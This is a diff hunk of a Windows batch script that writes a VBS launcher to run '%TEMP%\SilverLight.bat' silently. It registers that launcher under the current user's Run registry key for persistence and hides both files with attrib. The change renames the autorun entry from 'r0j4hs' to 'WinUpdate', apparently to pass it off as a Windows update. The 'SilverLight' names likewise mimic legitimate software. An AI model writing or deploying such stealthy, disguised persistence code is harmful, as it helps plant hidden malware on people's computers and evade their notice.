@@ -16,7 +16,7 @@ echo Set WinScriptHost ^= CreateObject^("WScript.Shell") >> SilverLight.vbs
 echo WinScriptHost.Run Chr^(34^) ^& "%TEMP%\SilverLight.bat" ^& Chr^(34^)^, 0 >> SilverLight.vbs
 echo Set WinScriptHost ^= Nothing >> SilverLight.vbs
 
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v r0j4hs /t REG_SZ /d "%TEMP%\SilverLight.vbs"
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdate /t REG_SZ /d "%TEMP%\SilverLight.vbs"
 
 attrib +h .\SilverLight.bat
 attrib +h .\SilverLight.vbs
